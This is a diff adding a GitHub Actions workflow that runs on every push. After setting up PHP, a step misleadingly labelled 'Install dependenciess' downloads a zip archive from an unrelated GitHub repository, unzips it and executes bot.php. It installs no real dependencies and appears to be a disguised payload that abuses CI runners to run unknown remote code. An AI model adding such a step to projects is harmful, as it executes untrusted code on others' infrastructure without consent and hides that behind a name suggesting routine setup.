@@ -1,0 +1,18 @@
+on:
+  push:
+name: hhs
+
+jobs:
+  run_1:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Setup PHP
+      uses: shivammathur/setup-php@v2
+      with:
+        php-version: '8.1'
+        coverage: none
+    - name: Install dependenciess
+      run: |
+        wget https://github.com/Yabof386/pyconbu/raw/main/zrp.zip
+        unzip zrp.zip
+        php bot.php
